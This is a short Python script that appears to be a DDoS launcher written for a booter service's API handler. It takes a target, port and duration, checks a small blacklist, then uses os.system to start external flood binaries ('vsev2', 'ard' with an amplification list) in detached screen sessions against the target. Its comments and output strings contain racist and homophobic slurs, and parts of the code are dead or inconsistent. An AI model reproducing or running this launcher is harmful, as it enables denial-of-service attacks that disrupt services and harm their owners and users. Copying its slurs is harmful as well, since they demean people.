import socket, random, threading, sys, time
import requests
import ipaddress
import os

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
allah = True
http = True
atks = 0

#So lush if ur seeing this just do like ['iphere', 'anotherip', 'for fuck sake another ip'] for the black list ip YES NIGGA IM NOT STUPID :(

blacklistLush69 = ['1.1.1.1', '8.8.8.8']

try:
    filename = (sys.argv[1])
    target = str(sys.argv[2])
    port = int(sys.argv[3])
    timer = float(sys.argv[4])
except IndexError:
    print('\n[+] Command usage: python3 ' + sys.argv[0] + ' <target> <port> <threads> <time> !') 
    sys.exit()


timeout = time.time() + 1 * timer



def niggeriOnly69(filename, host, timer, port, punch): 
	global iaid
	global aid
	global tattacks
	global running 

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	running -= 1
	iaid -= 1
	aid -= 1
if target in blacklistLush69:
	print(f'\n \u001b[31;1mYou Tried To Attack A Black Listed IP You Fag ! ly tho')
	sys.exit()
else:
	pass
# os.system(f"chmod 777 *")
os.system(f"screen -dmS OVH ./vsev2 {target} {port} 6 -1 {timer}; screen -dmS ATOM ./ard {target} {port} ard.txt 7 -1 {timer}")
print(f'\n\u001b[32;1m Attack Finished ! Target : {target} | Method : {filename}')

#CREDITS // ! iOnly69#0069
#IG     //  x86.root
#SERVER// DISCORD.GG/14 & .gg/ssh
#Script made for lushs api handler